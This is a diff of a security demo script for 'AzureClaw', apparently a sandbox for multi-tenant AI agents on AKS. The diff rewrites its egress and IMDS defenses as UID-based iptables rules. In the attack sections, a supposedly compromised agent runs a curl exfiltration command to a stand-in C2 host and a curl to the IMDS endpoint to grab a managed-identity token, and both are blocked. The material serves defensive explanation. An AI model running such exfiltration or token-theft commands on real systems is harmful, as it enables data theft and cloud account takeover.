@@ -2,8 +2,8 @@
 
 ## Multi-Agent Supply Chain Security Scenario
 
-> **Duration**: ~30 minutes  
-> **Audience**: Security engineers, platform teams, CISOs, Azure architects  
+> **Duration**: ~30 minutes
+> **Audience**: Security engineers, platform teams, CISOs, Azure architects
 > **Theme**: Cross-company multi-agent collaboration in a shared AKS runtime — how AzureClaw detects, isolates, and contains a compromised agent before it can laterally move to other tenants
 
 ---
@@ -267,18 +267,26 @@ The compromised agent tries to send Contoso's financial data to the attacker's C
 curl -v https://evil-c2.attacker.com/exfil -d '{"data":"base64_financial_records"}'
 ```
 
-**Layer 2: Kubernetes NetworkPolicy (Cilium L3/L4) — BLOCKED**
+**Layer 2: iptables egress-guard + NetworkPolicy — BLOCKED**
 
 ```
 curl: (7) Failed to connect to evil-c2.attacker.com port 443:
-  Connection refused (blocked by NetworkPolicy)
+  Connection refused
 
-# Only pre-approved endpoints are reachable:
-# ✅ api.fabrikam.com:443
-# ✅ legal-apis.com:443
+# The agent container (UID 1000) is restricted by iptables rules
+# installed by the egress-guard init container:
+#
+# iptables -A OUTPUT -m owner --uid-owner 1000 -o lo -j ACCEPT
+# iptables -A OUTPUT -m owner --uid-owner 1000 -p udp --dport 53 -j ACCEPT
+# iptables -A OUTPUT -m owner --uid-owner 1000 -j DROP
+#
+# Only these targets are reachable from the agent:
+# ✅ localhost:8443 (inference-router sidecar)
 # ✅ DNS (kube-dns:53)
-# ✅ inference-router (sidecar localhost)
-# ✗ EVERYTHING ELSE — default-deny egress
+# ✗ EVERYTHING ELSE — iptables DROP for UID 1000
+#
+# Even the "approved endpoints" (api.fabrikam.com, legal-apis.com)
+# can only be reached BY the inference-router, not by the agent directly.
 ```
 
 **What the operator sees:**
@@ -450,21 +458,30 @@ securityContext:
 curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
 ```
 
-**Layer 6: IMDS NetworkPolicy — SELECTIVELY BLOCKED**
+**Layer 6: iptables egress-guard — UID-BASED BLOCKING**
 
 ```
-# Only the inference-router sidecar container can reach IMDS
-# The openclaw agent container CANNOT reach IMDS
-
-# NetworkPolicy for IMDS access:
-#   ✅ inference-router container (needs IMDS for Azure auth) → 169.254.169.254:80 ALLOWED
-#   ✗  openclaw container → 169.254.169.254:80 DENIED
+# AzureClaw uses an iptables init container ("egress-guard") that sets up
+# per-UID egress rules BEFORE the main containers start:
+#
+#   OpenClaw agent (UID 1000):
+#     ✅ localhost (loopback)        → ACCEPT  (reach inference-router sidecar)
+#     ✅ DNS (UDP/TCP port 53)       → ACCEPT  (name resolution)
+#     ✗  169.254.169.254 (IMDS)     → DROP    (credential theft blocked)
+#     ✗  ALL other egress            → DROP    (exfiltration blocked)
+#
+#   Inference router (UID 1001):
+#     ✅ All egress allowed           → controlled by K8s NetworkPolicy
+#     ✅ 169.254.169.254 (IMDS)      → ALLOWED (needs IMDS for Azure auth)
+#
+# K8s NetworkPolicy has no per-container granularity (it's pod-level).
+# iptables UID-based rules solve this within the shared network namespace.
 #
 # The agent never touches Azure credentials.
-# The Rust sidecar is the sole auth gateway.
+# The Rust sidecar (UID 1001) is the sole auth gateway.
 ```
 
-**Talking point**: This is a critical security design. In typical setups, any container on the node can reach IMDS and steal the kubelet's managed identity token. AzureClaw's NetworkPolicy ensures only the trusted Rust inference router (written in memory-safe Rust, not user code) can access IMDS.
+**Talking point**: This is a critical security design. Kubernetes NetworkPolicy operates at the pod level — it can't distinguish between containers in the same pod. AzureClaw solves this with an `egress-guard` init container that installs iptables rules keyed on UID. The agent container (UID 1000) is locked to localhost + DNS only. It can't reach IMDS, can't reach external hosts, can't exfiltrate data. The inference router (UID 1001) is the sole gateway to Azure — and it's written in memory-safe Rust, not user code.
 
 ### Attack 3f: Token Budget Exhaustion (Resource Abuse)
 
@@ -578,9 +595,9 @@ azureclaw up --name fabrikam-legal-agent-v2 \
 | **L1** | Azure Linux 3.0 | Immutable OS, SELinux enforcing, verified boot | Baseline |
 | **L2** | Kata VM (Confidential) | Container escape → trapped in VM, not host kernel | Phase 3b |
 | **L3** | seccomp + capabilities | mount, mknod, ptrace, module loading blocked | Phase 3d |
-| **L4** | Kubernetes NetworkPolicy | Exfiltration to C2 server blocked, lateral movement blocked | Phase 3a, 3c |
-| **L5** | Namespace isolation | Cross-company agent communication impossible | Phase 3c |
-| **L6** | Rust inference router | Agent never sees Azure credentials, IMDS restricted | Phase 3e |
+| **L4** | iptables egress-guard (UID-based) | Agent (UID 1000) blocked from all egress except localhost + DNS | Phase 3a, 3e |
+| **L5** | Namespace isolation + NetworkPolicy | Cross-company agent communication impossible, pod-level egress control | Phase 3c |
+| **L6** | Rust inference router | Agent never sees Azure credentials, IMDS restricted to UID 1001 | Phase 3e |
 | **L7** | Content Safety + Prompt Shields | Prompt injection detected before model execution | Phase 2 |
 | **L8** | Token budgets | Resource exhaustion capped per sandbox | Phase 3f |
 
@@ -593,7 +610,7 @@ azureclaw up --name fabrikam-legal-agent-v2 \
 | Multi-tenant namespace isolation | Manual | Single-tenant | ✅ Automatic per-sandbox |
 | Pod-to-pod network isolation | Manual NetworkPolicy | Basic | ✅ Default-deny + approval flow |
 | Container escape protection | None (shared kernel) | gVisor (partial) | ✅ Kata VM (own kernel) |
-| IMDS credential theft prevention | None | None | ✅ NetworkPolicy + sidecar-only access |
+| IMDS credential theft prevention | None | None | ✅ iptables UID-based rules — agent UID blocked from IMDS |
 | Prompt injection detection | None | None | ✅ Azure AI Prompt Shields |
 | Content safety filtering | None | NeMo Guardrails | ✅ Azure AI Content Safety |
 | Token budget enforcement | None | None | ✅ Per-sandbox daily + per-request limits |
